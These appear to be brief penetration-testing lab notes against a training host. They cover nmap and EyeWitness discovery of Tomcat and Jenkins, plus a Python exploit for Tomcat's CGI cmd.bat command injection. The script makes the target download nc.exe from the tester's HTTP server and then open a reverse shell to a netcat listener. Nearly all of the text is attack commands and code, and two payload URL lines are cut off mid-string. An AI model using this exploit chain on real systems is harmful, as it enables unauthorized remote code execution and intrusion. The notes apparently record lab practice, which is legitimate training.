```
sudo apt install eyewitness
sudo nmap -Pn 10.129.2.34 -A -oA web_discovery
eyewitness --web -x  web_discovery.xml -d inlanefreight_eyewitness
```
- Tomcat on 8080
- Jenkins on 8000

```
locate nc.exe
sudo mv nc.exe .
python3 -m http.server 8090
nc -lvnp 1234
```
```
 #!/usr/bin/env python3
 import time
 import requests
 host='10.129.2.34'#add host to connect
 port='8080'#add port of host {default:8080}
 server_ip='10.10.15.228'#server that has nc.exe file to get reverse shell
 server_port='8090'
 nc_ip='10.10.15.228'
 nc_port='1234'
url1 = host + ":" + str(port) + "/cgi/cmd.bat?" + "&&C%3a%5cWindows%5cSystem>
url2 = host + ":" + str(port) + "/cgi/cmd.bat?&nc.exe+" + server_ip + "+" + >
try:
    requests.get("http://" + url1)
    time.sleep(2)
    requests.get("http://" + url2)
    print(url2)
except:
    print("Some error occured in the script")
```
